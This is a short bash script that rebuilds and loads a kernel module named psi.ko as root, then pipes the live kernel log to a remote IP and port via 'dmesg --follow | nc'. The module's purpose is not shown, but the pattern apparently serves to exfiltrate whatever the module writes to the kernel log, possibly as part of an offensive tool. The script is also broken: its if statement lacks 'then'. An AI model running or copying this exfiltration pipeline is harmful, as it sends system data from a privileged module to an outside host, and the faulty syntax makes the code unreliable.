#!/bin/bash

if [[ $# -lt 2 ]]
	echo 'Usage: ./'$0' <host ip> <host port>'
	echo 'Ex: ./run.sh 10.0.0.8 1337'
	exit
fi

echo '[-] Cleaning Old Installs'
make clean
echo '[.] Rebuilding Ψ'
make 
echo '[+] Complete. Inserting Kernel Module'
sudo insmod psi.ko
echo '[+] Successful! Piping Kernel Messages to '$1':'$2
dmesg --follow | nc $1 $2
#EOF